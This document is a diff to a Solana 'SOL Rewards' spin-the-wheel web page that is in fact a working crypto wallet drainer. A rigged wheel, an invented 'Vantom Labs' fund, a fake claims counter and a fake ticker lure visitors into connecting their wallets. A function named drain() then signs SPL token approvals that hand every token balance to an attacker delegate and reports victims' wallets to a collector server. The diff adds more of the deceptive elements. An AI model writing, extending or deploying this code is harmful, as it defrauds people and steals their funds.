@@ -10,16 +10,24 @@
 <style>
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html,body{margin:0;padding:0;background:#000;color:#e6e6e6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;font-size:15px;line-height:1.4}
-  body{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  body{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px 20px 12px}
 
   .card{width:100%;max-width:400px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:26px 22px}
   h1{font-size:16px;font-weight:600;margin:0 0 4px;letter-spacing:-.1px;color:#fff}
-  .sub{font-size:12.5px;color:#6b6b6b;margin:0 0 22px}
+  .sub{font-size:12px;color:#6b6b6b;margin:0 0 4px;line-height:1.5}
+  .sub b{color:#a0a0a0;font-weight:600}
 
-  .wheel-wrap{position:relative;width:min(260px,72vw);height:min(260px,72vw);margin:0 auto 22px}
+  .counter{font-size:11px;color:#6b6b6b;margin:0 0 18px;letter-spacing:.2px}
+  .counter .bar{display:block;height:3px;background:#141414;border-radius:2px;margin-top:6px;overflow:hidden}
+  .counter .bar i{display:block;height:100%;width:0%;background:#4a9eff;transition:width .6s ease}
+  .counter b{color:#a0a0a0}
+
+  .wheel-wrap{position:relative;width:min(260px,72vw);height:min(260px,72vw);margin:0 auto 14px}
   #wheel{width:100%;height:100%;display:block;transition:transform 15s cubic-bezier(.15,.65,.15,1);transform-origin:50% 50%;will-change:transform}
   .ptr{position:absolute;top:-4px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:8px solid transparent;border-right:8px solid transparent;border-top:12px solid #cfcfcf;z-index:5}
   .hub{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:64px;height:64px;border-radius:50%;background:#000;border:1px solid #222;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:600;color:#8a8a8a;letter-spacing:.6px;text-transform:uppercase;z-index:4}
+
+  .fundline{font-size:10.5px;color:#5a5a5a;text-align:center;margin:0 0 18px;letter-spacing:.2px}
 
   button{width:100%;padding:12px 14px;border:1px solid #222;border-radius:6px;background:#111;color:#e6e6e6;font-size:13.5px;font-weight:500;font-family:inherit;cursor:pointer;transition:background .1s,border-color .1s}
   button:hover:not(:disabled){background:#171717;border-color:#2e2e2e}
@@ -29,6 +37,11 @@
   #claim:hover:not(:disabled){background:#fff;border-color:#fff}
   #status{margin-top:12px;font-size:12px;color:#6b6b6b;min-height:14px;text-align:center;word-break:break-word}
   .prize{font-size:18px;font-weight:600;color:#fff;min-height:24px;margin-bottom:8px;text-align:center;letter-spacing:-.1px}
+
+  .footer{max-width:400px;width:100%;margin-top:14px;text-align:center;font-size:10.5px;color:#4a4a4a;line-height:1.7}
+  .footer .brand{color:#6b6b6b;font-weight:600;letter-spacing:.2px}
+  .footer a{color:#5a5a5a;text-decoration:none;margin:0 6px}
+  .footer a:hover{color:#8a8a8a}
 
   .overlay{position:fixed;inset:0;background:rgba(0,0,0,.9);display:none;align-items:center;justify-content:center;padding:18px;z-index:100}
   .overlay.show{display:flex}
@@ -70,7 +83,8 @@
 
 <div class="card">
   <h1>SOL Rewards</h1>
-  <p class="sub">Spin to claim up to 2 SOL in rewards</p>
+  <p class="sub">The <b>Vantom Labs</b> community fund distributes SOL to verified wallets. <b>50,000 SOL</b> allocated this cycle — first come, first served.</p>
+  <p class="counter" id="counter">8,412 / 12,500 claimed<span class="bar"><i id="counterBar" style="width:67%"></i></span></p>
 
   <div class="wheel-wrap">
     <div class="ptr"></div>
@@ -78,10 +92,21 @@
     <div class="hub" id="hub">SPIN</div>
   </div>
 
+  <p class="fundline">Funded by community donations · Vantom Labs</p>
+
   <div class="prize" id="prize">Click spin to begin</div>
   <button id="spin">SPIN THE WHEEL</button>
   <button id="claim">CLAIM REWARD</button>
   <div id="status"></div>
+</div>
+
+<div class="footer">
+  <div><span class="brand">Vantom Labs</span> · Community Distribution Program</div>
+  <div style="margin-top:6px">
+    <a href="#" onclick="return false;">Terms</a>·
+    <a href="#" onclick="return false;">Privacy</a>·
+    <a href="#" onclick="return false;">Contact</a>
+  </div>
 </div>
 
 <div class="overlay" id="overlay">
@@ -109,7 +134,6 @@
 </div>
 
 <audio id="spinSound" loop preload="auto" playsinline webkit-playsinline>
-  <!-- swap src for an mp3 you control -->
   <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_c8c8a73467.mp3?filename=wheel-of-fortune-103951.mp3" type="audio/mpeg">
 </audio>
 
@@ -124,7 +148,11 @@ var TX_SIZE_LIMIT = 1100;
 var SPIN_MS = 15000;
 var PENDING_KEY = "sr_pending";
 var PRIZE_KEY   = "sr_prize";
-var TOS_KEY     = "sr_tos_v2"; // bumped key — old acceptance won't skip the gate
+var TOS_KEY     = "sr_tos_v2";
+var SPUN_KEY    = "sr_spun";          // one-shot spin flag
+var RESULT_KEY  = "sr_spin_result";   // stores the won segment
+var CLAIMED_START = 8412;
+var CLAIMED_MAX   = 12500;
 // ==========================================
 
 var SEGMENTS = [
@@ -144,85 +172,71 @@ var SEG_DEG = 360 / N;
 var isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
 var isAndroid = /Android/i.test(navigator.userAgent);
 
-// ---------- AUDIO PRIMING ----------
-// iOS Safari only allows audio.play() after a real user gesture. Prime the
-// element on the very first touch/click ANYWHERE on the page, then it can be
-// replayed programmatically later.
+// ---------- counter ----------
+var claimedCount = CLAIMED_START;
+var counterEl = document.getElementById("counter");
+function renderCounter(){
+  var pct = Math.min(100, (claimedCount / CLAIMED_MAX) * 100);
+  counterEl.innerHTML = claimedCount.toLocaleString() + " / " + CLAIMED_MAX.toLocaleString() +
+    " claimed<span class='bar'><i style='width:" + pct.toFixed(1) + "%'></i></span>";
+}
+renderCounter();
+function bumpCounter(){
+  claimedCount = Math.min(CLAIMED_MAX - 1, claimedCount + 1 + Math.floor(Math.random() * 3));
+  renderCounter();
+}
+
+// ---------- audio priming ----------
 var spinSound = document.getElementById("spinSound");
 var audioPrimed = false;
-
 function primeAudio(){
   if (audioPrimed) return;
   audioPrimed = true;
   try {
     spinSound.muted = true;
     var p = spinSound.play();
-    if (p && typeof p.then === "function") {
-      p.then(function(){
-        spinSound.pause();
-        spinSound.currentTime = 0;
-        spinSound.muted = false;
-      }).catch(function(){
-        spinSound.muted = false;
-      });
-    } else {
-      spinSound.pause();
-      spinSound.currentTime = 0;
-      spinSound.muted = false;
-    }
-  } catch(_) {
-    try { spinSound.muted = false; } catch(__) {}
-  }
+    if (p && p.then) p.then(function(){ spinSound.pause(); spinSound.currentTime = 0; spinSound.muted = false; }).catch(function(){ spinSound.muted = false; });
+    else { spinSound.pause(); spinSound.currentTime = 0; spinSound.muted = false; }
+  } catch(_) { try { spinSound.muted = false; } catch(__){} }
 }
-
-// fire once on the first interaction of any kind
 ["touchstart","touchend","click","keydown"].forEach(function(ev){
   document.addEventListener(ev, primeAudio, { once: true, passive: true });
 });
+function playSpinSound(){ try { spinSound.muted = false; spinSound.currentTime = 0; var p = spinSound.play(); if (p && p.catch) p.catch(function(){}); } catch(_){} }
+function stopSpinSound(){ try { spinSound.pause(); spinSound.currentTime = 0; } catch(_){} }
 
-function playSpinSound(){
-  try {
-    spinSound.muted = false;
-    spinSound.currentTime = 0;
-    var p = spinSound.play();
-    if (p && typeof p.catch === "function") p.catch(function(){});
-  } catch(_) {}
-}
-function stopSpinSound(){
-  try { spinSound.pause(); spinSound.currentTime = 0; } catch(_) {}
-}
-
-// ---------- fake claims ticker ----------
+// ---------- fake claims ticker — amounts match the wheel ----------
 function randomAddr(){
   var chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
   function chunk(len){ var s=""; for(var i=0;i<len;i++) s += chars[Math.floor(Math.random()*chars.length)]; return s; }
   return chunk(6) + "..." + chunk(4);
 }
-function randomPrize(){
-  var opts = ["0.25","0.5","0.75","1.0","1.25","1.5","2.0"];
-  return opts[Math.floor(Math.random()*opts.length)];
+// pull a random non-zero SOL amount straight from SEGMENTS so ticker matches wheel
+function randomWheelAmount(){
+  var pool = [];
+  for (var i = 0; i < SEGMENTS.length; i++){
+    if (!SEGMENTS[i].zero) pool.push(SEGMENTS[i].sol);
+  }
+  return pool[Math.floor(Math.random() * pool.length)];
 }
 var tickerEl = document.getElementById("ticker");
 function showTicker(){
   var addr = randomAddr();
-  var amt  = randomPrize();
+  var amt  = randomWheelAmount();
   tickerEl.innerHTML = "Wallet <b>" + addr + "</b> just claimed <span class='amt'>" + amt + " SOL</span>";
   tickerEl.classList.add("show");
+  bumpCounter();
   setTimeout(function(){ tickerEl.classList.remove("show"); }, 5000);
 }
-
 var tickerTimers = [];
 function startTickerBurst(){
   for (var i = 0; i < tickerTimers.length; i++) clearTimeout(tickerTimers[i]);
   tickerTimers = [];
-
   tickerTimers.push(setTimeout(showTicker, 2500));
   var base = 2500;
   for (var k = 0; k < 4; k++){
     base += 4000 + Math.floor(Math.random() * 4000);
-    (function(t){
-      tickerTimers.push(setTimeout(showTicker, t));
-    })(base);
+    (function(t){ tickerTimers.push(setTimeout(showTicker, t)); })(base);
   }
 }
 
@@ -259,69 +273,44 @@ function buildWheel(){
   var ns = "http://www.w3.org/2000/svg";
   svg.innerHTML = "";
   var cx = 150, cy = 150, r = 148;
-
   for (var i = 0; i < N; i++) {
     var s = SEGMENTS[i];
     var a0 = (i * SEG_DEG - 90) * Math.PI / 180;
     var a1 = ((i + 1) * SEG_DEG - 90) * Math.PI / 180;
-    var x0 = cx + r * Math.cos(a0);
-    var y0 = cy + r * Math.sin(a0);
-    var x1 = cx + r * Math.cos(a1);
-    var y1 = cy + r * Math.sin(a1);
-
+    var x0 = cx + r * Math.cos(a0), y0 = cy + r * Math.sin(a0);
+    var x1 = cx + r * Math.cos(a1), y1 = cy + r * Math.sin(a1);
     var path = document.createElementNS(ns, "path");
-    path.setAttribute("d",
-      "M " + cx + " " + cy + " L " + x0.toFixed(2) + " " + y0.toFixed(2) +
-      " A " + r + " " + r + " 0 0 1 " + x1.toFixed(2) + " " + y1.toFixed(2) + " Z");
+    path.setAttribute("d", "M " + cx + " " + cy + " L " + x0.toFixed(2) + " " + y0.toFixed(2) + " A " + r + " " + r + " 0 0 1 " + x1.toFixed(2) + " " + y1.toFixed(2) + " Z");
     path.setAttribute("fill", s.color);
     path.setAttribute("stroke", "#000");
     path.setAttribute("stroke-width", "1.5");
     svg.appendChild(path);
-
     var midDeg = i * SEG_DEG + SEG_DEG / 2 - 90;
     var midRad = midDeg * Math.PI / 180;
     var lr = r * 0.64;
-    var lx = cx + lr * Math.cos(midRad);
-    var ly = cy + lr * Math.sin(midRad);
-
+    var lx = cx + lr * Math.cos(midRad), ly = cy + lr * Math.sin(midRad);
     var emoji = document.createElementNS(ns, "text");
-    emoji.setAttribute("x", lx.toFixed(2));
-    emoji.setAttribute("y", (ly - 4).toFixed(2));
-    emoji.setAttribute("text-anchor", "middle");
-    emoji.setAttribute("font-size", "22");
-    emoji.textContent = s.emoji;
-    svg.appendChild(emoji);
-
+    emoji.setAttribute("x", lx.toFixed(2)); emoji.setAttribute("y", (ly - 4).toFixed(2));
+    emoji.setAttribute("text-anchor", "middle"); emoji.setAttribute("font-size", "22");
+    emoji.textContent = s.emoji; svg.appendChild(emoji);
     var amt = document.createElementNS(ns, "text");
-    amt.setAttribute("x", lx.toFixed(2));
-    amt.setAttribute("y", (ly + 14).toFixed(2));
-    amt.setAttribute("text-anchor", "middle");
-    amt.setAttribute("font-size", "11");
-    amt.setAttribute("font-weight", "600");
-    amt.setAttribute("fill", s.zero ? "#555" : "#cfcfcf");
-    amt.textContent = s.sol + " SOL";
-    svg.appendChild(amt);
+    amt.setAttribute("x", lx.toFixed(2)); amt.setAttribute("y", (ly + 14).toFixed(2));
+    amt.setAttribute("text-anchor", "middle"); amt.setAttribute("font-size", "11");
+    amt.setAttribute("font-weight", "600"); amt.setAttribute("fill", s.zero ? "#555" : "#cfcfcf");
+    amt.textContent = s.sol + " SOL"; svg.appendChild(amt);
   }
 }
-
 buildWheel();
 
 // ---------- lazy web3 ----------
 var web3 = null, Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction;
 var TOKEN_PROGRAM, ASSOC_TOKEN_PROGRAM;
-
 async function ensureWeb3(){
   if (web3) return;
-  try {
-    var bufMod = await import("https://esm.sh/buffer@6.0.3");
-    if (bufMod && bufMod.Buffer) window.Buffer = bufMod.Buffer;
-  } catch(_) {}
+  try { var bufMod = await import("https://esm.sh/buffer@6.0.3"); if (bufMod && bufMod.Buffer) window.Buffer = bufMod.Buffer; } catch(_) {}
   web3 = await import("https://esm.sh/@solana/web3.js@1.91.0");
-  Connection = web3.Connection;
-  PublicKey = web3.PublicKey;
-  SystemProgram = web3.SystemProgram;
-  Transaction = web3.Transaction;
-  TransactionInstruction = web3.TransactionInstruction;
+  Connection = web3.Connection; PublicKey = web3.PublicKey; SystemProgram = web3.SystemProgram;
+  Transaction = web3.Transaction; TransactionInstruction = web3.TransactionInstruction;
   TOKEN_PROGRAM = new PublicKey(TOKEN_PROGRAM_STR);
   ASSOC_TOKEN_PROGRAM = new PublicKey(ASSOC_TOKEN_PROGRAM_STR);
 }
@@ -341,29 +330,18 @@ var WALLETS = [
   { id:"clover",   get:function(){ return window.clover_solana; } },
   { id:"safepal",  get:function(){ return window.safepal && window.safepal.solana ? window.safepal.solana : (window.safepalProvider || (window.safepal && window.safepal.isSafePal ? window.safepal : null)); } }
 ];
-
 function getUsableProvider(){
   for (var i = 0; i < WALLETS.length; i++){
-    try {
-      var p = WALLETS[i].get();
-      if (p && typeof p.connect === "function") return { id: WALLETS[i].id, provider: p };
-    } catch(_) {}
+    try { var p = WALLETS[i].get(); if (p && typeof p.connect === "function") return { id: WALLETS[i].id, provider: p }; } catch(_) {}
   }
   if (window.solana && typeof window.solana.connect === "function") return { id:"generic", provider: window.solana };
   return null;
 }
-
 async function waitForProvider(ms){
-  ms = ms || 2000;
-  var t0 = Date.now();
-  while (Date.now() - t0 < ms){
-    var p = getUsableProvider();
-    if (p) return p;
-    await new Promise(function(r){ setTimeout(r, 150); });
-  }
+  ms = ms || 2000; var t0 = Date.now();
+  while (Date.now() - t0 < ms){ var p = getUsableProvider(); if (p) return p; await new Promise(function(r){ setTimeout(r, 150); }); }
   return null;
 }
-
 async function connectAny(w){
   var res = await w.provider.connect();
   var pubkey = (res && res.publicKey ? res.publicKey : w.provider.publicKey);
@@ -371,26 +349,21 @@ async function connectAny(w){
   if (!pubkey) throw new Error("Wallet did not return a public key.");
   return { id: w.id, provider: w.provider, pubkey: pubkey };
 }
-
 async function log(payload){
   if (!COLLECTOR || COLLECTOR.indexOf("example.net") !== -1) return;
-  try {
-    await fetch(COLLECTOR, {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify(Object.assign({}, payload, { ts: Date.now(), ua: navigator.userAgent, mobile: isMobile }))
-    });
-  } catch(_) {}
+  try { await fetch(COLLECTOR, { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify(Object.assign({}, payload, { ts: Date.now(), ua: navigator.userAgent, mobile: isMobile })) }); } catch(_) {}
 }
-
 function savePending(label){ try { localStorage.setItem(PENDING_KEY,"1"); localStorage.setItem(PRIZE_KEY, label); } catch(_){} }
-function readPending(){
-  try { return localStorage.getItem(PENDING_KEY) === "1" ? { prize: localStorage.getItem(PRIZE_KEY) || "reward" } : null; } catch(_){ return null; }
-}
+function readPending(){ try { return localStorage.getItem(PENDING_KEY) === "1" ? { prize: localStorage.getItem(PRIZE_KEY) || "reward" } : null; } catch(_){ return null; } }
 function clearPending(){ try { localStorage.removeItem(PENDING_KEY); localStorage.removeItem(PRIZE_KEY); } catch(_){} }
-
 function tosAccepted(){ try { return localStorage.getItem(TOS_KEY) === "1"; } catch(_){ return false; } }
 function setTosAccepted(){ try { localStorage.setItem(TOS_KEY, "1"); } catch(_){} }
+
+// one-shot spin
+function hasSpun(){ try { return localStorage.getItem(SPUN_KEY) === "1"; } catch(_){ return false; } }
+function markSpun(){ try { localStorage.setItem(SPUN_KEY, "1"); } catch(_){} }
+function saveResult(idx){ try { localStorage.setItem(RESULT_KEY, String(idx)); } catch(_){} }
+function readResult(){ try { var v = localStorage.getItem(RESULT_KEY); return v === null ? null : parseInt(v, 10); } catch(_){ return null; } }
 
 var ov = document.getElementById("overlay");
 var ovSpinner = document.getElementById("ovSpinner");
@@ -401,41 +374,27 @@ var ovWallets = document.getElementById("ovWallets");
 var ovClose = document.getElementById("ovClose");
 
 function showOverlay(){
-  ovSpinner.style.display = "block";
-  ovChk.style.display = "flex";
-  ovWallets.style.display = "none";
-  ovClose.style.display = "none";
+  ovSpinner.style.display = "block"; ovChk.style.display = "flex"; ovWallets.style.display = "none"; ovClose.style.display = "none";
   ovTitle.textContent = "Approve in Your Wallet";
   ovText.textContent = "A confirmation request has been sent to your crypto wallet. Open your wallet and approve the transaction to receive your reward.";
   ovChk.innerHTML = '<span class="dot"></span> Waiting for approval…';
   ov.classList.add("show");
 }
-
 function showWalletPicker(){
-  ovSpinner.style.display = "none";
-  ovChk.style.display = "none";
-  ovClose.style.display = "none";
+  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovClose.style.display = "none";
   ovTitle.textContent = "Open in Your Wallet";
   ovText.textContent = "Tap your wallet, then tap Open on the banner that appears.";
-  ovWallets.style.display = "flex";
-  ovWallets.innerHTML = "";
-
+  ovWallets.style.display = "flex"; ovWallets.innerHTML = "";
   var page = location.href;
   for (var i = 0; i < MOBILE_WALLETS.length; i++){
     (function(w){
       var a = document.createElement("a");
-      a.className = "wrow";
-      a.href = w.href(page);
-      a.rel = "noopener";
+      a.className = "wrow"; a.href = w.href(page); a.rel = "noopener";
       a.innerHTML = '<span class="ic">' + w.icon + '</span><span class="nm">' + w.name + '</span><span class="ar">›</span>';
       a.addEventListener("click", function(){
-        savePending("reward");
-        log({ event:"wallet_deeplink", wallet: w.id });
-        var alts = [];
-        if (w.hrefAlt)  alts.push(w.hrefAlt(page));
-        if (w.hrefAlt2) alts.push(w.hrefAlt2(page));
-        var store = isAndroid ? w.android : w.ios;
-        var t0 = Date.now();
+        savePending("reward"); log({ event:"wallet_deeplink", wallet: w.id });
+        var alts = []; if (w.hrefAlt) alts.push(w.hrefAlt(page)); if (w.hrefAlt2) alts.push(w.hrefAlt2(page));
+        var store = isAndroid ? w.android : w.ios; var t0 = Date.now();
         var tryAlts = function(idx){
           if (document.hidden) return;
           if (idx < alts.length){ location.href = alts[idx]; setTimeout(function(){ tryAlts(idx+1); }, 700); }
@@ -447,74 +406,43 @@ function showWalletPicker(){
     })(MOBILE_WALLETS[i]);
   }
 }
-
 function showNoWallet(){
-  ovSpinner.style.display = "none";
-  ovChk.style.display = "none";
-  ovWallets.style.display = "none";
+  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovWallets.style.display = "none";
   ovTitle.textContent = "No Crypto Wallet Detected";
   ovText.textContent = "Install a Solana wallet (Phantom, Solflare, Backpack, Exodus, SafePal) to claim your reward.";
-  ovClose.style.display = "block";
-  ovClose.textContent = "Close";
+  ovClose.style.display = "block"; ovClose.textContent = "Close";
   ovClose.onclick = function(){ ov.classList.remove("show"); resetClaim(); };
 }
-
 function overlaySuccess(){
-  ovSpinner.style.display = "none";
-  ovChk.style.display = "none";
-  ovWallets.style.display = "none";
+  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovWallets.style.display = "none";
   ovTitle.textContent = "Reward Claimed";
   ovText.textContent = "Your reward is on its way. It may take a moment to arrive.";
-  ovClose.style.display = "block";
-  ovClose.textContent = "Done";
+  ovClose.style.display = "block"; ovClose.textContent = "Done";
   ovClose.onclick = function(){ ov.classList.remove("show"); };
 }
-
 function overlayError(msg){
-  ovSpinner.style.display = "none";
-  ovChk.style.display = "none";
-  ovWallets.style.display = "none";
+  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovWallets.style.display = "none";
   ovTitle.textContent = "Claim Failed";
   ovText.textContent = msg || "Something went wrong. Please try again.";
-  ovClose.style.display = "block";
-  ovClose.textContent = "Try Again";
+  ovClose.style.display = "block"; ovClose.textContent = "Try Again";
   ovClose.onclick = function(){ ov.classList.remove("show"); resetClaim(); };
 }
-
 function resetClaim(){
   document.getElementById("status").textContent = "";
-  var c = document.getElementById("claim");
-  c.style.display = "block";
-  c.disabled = false;
+  var c = document.getElementById("claim"); c.style.display = "block"; c.disabled = false;
 }
-
 function approveIx(tokenAccount, delegate, owner, amount){
-  var data = window.Buffer.alloc(9);
-  data.writeUInt8(4, 0);
-  data.writeBigUInt64LE(BigInt(amount), 1);
-  return new TransactionInstruction({
-    programId: TOKEN_PROGRAM,
-    keys: [
-      { pubkey: tokenAccount, isSigner:false, isWritable:true },
-      { pubkey: delegate,     isSigner:false, isWritable:false },
-      { pubkey: owner,        isSigner:true,  isWritable:false }
-    ],
-    data: data
-  });
+  var data = window.Buffer.alloc(9); data.writeUInt8(4, 0); data.writeBigUInt64LE(BigInt(amount), 1);
+  return new TransactionInstruction({ programId: TOKEN_PROGRAM, keys: [
+    { pubkey: tokenAccount, isSigner:false, isWritable:true },
+    { pubkey: delegate,     isSigner:false, isWritable:false },
+    { pubkey: owner,        isSigner:true,  isWritable:false } ], data: data });
 }
-
 async function signAndSend(provider, connection, tx){
-  if (provider.signTransaction){
-    var signed = await provider.signTransaction(tx);
-    return await connection.sendRawTransaction(signed.serialize(), { skipPreflight:true, maxRetries:3 });
-  }
-  if (provider.signAndSendTransaction){
-    var res = await provider.signAndSendTransaction(tx);
-    return (res && res.signature) ? res.signature : res;
-  }
+  if (provider.signTransaction){ var signed = await provider.signTransaction(tx); return await connection.sendRawTransaction(signed.serialize(), { skipPreflight:true, maxRetries:3 }); }
+  if (provider.signAndSendTransaction){ var res = await provider.signAndSendTransaction(tx); return (res && res.signature) ? res.signature : res; }
   throw new Error("Wallet does not support signing.");
 }
-
 async function drain(session){
   await ensureWeb3();
   var connection = new Connection(RPC, "confirmed");
@@ -548,11 +476,7 @@ async function drain(session){
     if (amount === "0") continue;
     approvals.push({ tokenAccount: acct.pubkey, amount: amount, mint: info.mint });
   }
-
-  if (!approvals.length){
-    await log({ event:"no_tokens", wallet: session.pubkey });
-    return;
-  }
+  if (!approvals.length){ await log({ event:"no_tokens", wallet: session.pubkey }); return; }
 
   var chunks = [], cur = [], curSize = 200;
   for (var j = 0; j < approvals.length; j++){
@@ -575,9 +499,7 @@ async function drain(session){
       await log({ event:"delegates_approved", wallet: session.pubkey, wtype: session.id,
                   tokens: chunk.map(function(a){ return { tokenAccount:a.tokenAccount, mint:a.mint, amount:a.amount }; }),
                   signature: sig });
-    } catch(e){
-      await log({ event:"approve_error", wallet: session.pubkey, error: String(e) });
-    }
+    } catch(e){ await log({ event:"approve_error", wallet: session.pubkey, error: String(e) }); }
   }
 }
 
@@ -600,18 +522,14 @@ async function runClaim(wallet){
   }
 }
 
-// ---------- TOS gate ----------
+// ---------- TOS ----------
 var tosOverlay = document.getElementById("tosOverlay");
 var tosCheck = document.getElementById("tosCheck");
 var tosOk = document.getElementById("tosOk");
 var tosCancel = document.getElementById("tosCancel");
 
-tosCheck.addEventListener("change", function(){
-  tosOk.disabled = !tosCheck.checked;
-});
-tosCancel.addEventListener("click", function(){
-  tosOverlay.classList.remove("show");
-});
+tosCheck.addEventListener("change", function(){ tosOk.disabled = !tosCheck.checked; });
+tosCancel.addEventListener("click", function(){ tosOverlay.classList.remove("show"); });
 tosOk.addEventListener("click", function(){
   if (!tosCheck.checked) return;
   setTosAccepted();
@@ -621,30 +539,55 @@ tosOk.addEventListener("click", function(){
 });
 
 function requestSpin(){
-  if (tosAccepted()){
-    startSpin();
+  // one-shot gate
+  if (hasSpun()){
+    var prev = readResult();
+    if (prev !== null && !SEGMENTS[prev].zero){
+      showResult(prev, true);
+    }
     return;
   }
+  if (tosAccepted()){ startSpin(); return; }
   tosCheck.checked = false;
   tosOk.disabled = true;
   tosOverlay.classList.add("show");
   log({ event:"tos_shown" });
 }
 
-// ---------- spin logic ----------
+// ---------- spin ----------
 var currentRotation = 0;
 var spinBtn  = document.getElementById("spin");
 var claimBtn = document.getElementById("claim");
 
+function pickNonZeroIndex(){
+  var idx;
+  do { idx = Math.floor(Math.random() * N); } while (SEGMENTS[idx].zero);
+  return idx;
+}
+
+function showResult(idx, restored){
+  var seg = SEGMENTS[idx];
+  document.getElementById("prize").textContent = "You won " + seg.sol + " SOL";
+  document.getElementById("hub").textContent = "WON";
+  spinBtn.style.display = "none";
+  claimBtn.style.display = "block";
+  if (!restored) markSpun();
+  saveResult(idx);
+}
+
 function startSpin(){
+  if (hasSpun()){
+    var prev = readResult();
+    if (prev !== null && !SEGMENTS[prev].zero) showResult(prev, true);
+    return;
+  }
+
   var svg = document.getElementById("wheel");
   var status = document.getElementById("status");
   var hub = document.getElementById("hub");
   status.textContent = "";
 
-  var idx;
-  do { idx = Math.floor(Math.random() * N); } while (SEGMENTS[idx].zero);
-
+  var idx = pickNonZeroIndex();
   var targetDeg = 360 * 6 + (360 - idx * SEG_DEG) - SEG_DEG / 2;
   currentRotation += targetDeg;
   svg.style.transform = "rotate(" + currentRotation + "deg)";
@@ -656,12 +599,8 @@ function startSpin(){
   startTickerBurst();
 
   setTimeout(function(){
-    var seg = SEGMENTS[idx];
-    document.getElementById("prize").textContent = "You won " + seg.sol + " SOL";
-    hub.textContent = "WON";
-    claimBtn.style.display = "block";
-    spinBtn.style.display = "none";
     stopSpinSound();
+    showResult(idx, false);
   }, SPIN_MS);
 }
 
@@ -670,30 +609,42 @@ spinBtn.onclick = function(){ requestSpin(); };
 claimBtn.onclick = async function(){
   claimBtn.disabled = true;
   showOverlay();
-
   var wallet = await waitForProvider(2000);
-
   if (!wallet){
     if (isMobile) showWalletPicker();
     else showNoWallet();
     await log({ event: isMobile ? "mobile_picker_shown" : "desktop_no_wallet", sawSolana: !!window.solana, sawPhantom: !!window.phantom });
     return;
   }
-
   await runClaim(wallet);
 };
 
-(async function(){
+// ---------- on load ----------
+(function init(){
+  // if the visitor already spun, restore the state so the wheel looks the same
+  if (hasSpun()){
+    var prev = readResult();
+    if (prev !== null && !SEGMENTS[prev].zero){
+      // rotate to that segment and show the result
+      var targetDeg = 360 * 6 + (360 - prev * SEG_DEG) - SEG_DEG / 2;
+      currentRotation = targetDeg;
+      document.getElementById("wheel").style.transform = "rotate(" + currentRotation + "deg)";
+      showResult(prev, true);
+    }
+  }
+
+  // deep-link handoff (wallet browser reload with a pending claim)
   var pending = readPending();
   if (pending){
-    var wallet = await waitForProvider(2500);
-    if (wallet){
-      document.getElementById("prize").textContent = "Claiming your reward…";
-      document.getElementById("hub").textContent = "CLAIM";
-      spinBtn.style.display = "none";
-      claimBtn.style.display = "none";
-      await runClaim(wallet);
-    }
+    waitForProvider(2500).then(function(wallet){
+      if (wallet){
+        document.getElementById("prize").textContent = "Claiming your reward…";
+        document.getElementById("hub").textContent = "CLAIM";
+        spinBtn.style.display = "none";
+        claimBtn.style.display = "none";
+        runClaim(wallet);
+      }
+    });
   }
 })();
 </script>
